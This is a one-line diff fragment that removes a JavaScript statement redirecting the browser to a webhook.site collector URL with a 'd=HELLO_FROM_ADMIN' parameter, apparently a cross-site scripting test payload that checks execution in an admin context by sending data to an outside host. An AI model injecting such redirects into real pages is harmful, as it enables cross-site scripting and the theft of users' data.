@@ -1,1 +1,0 @@
-location='https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?d=HELLO_FROM_ADMIN';
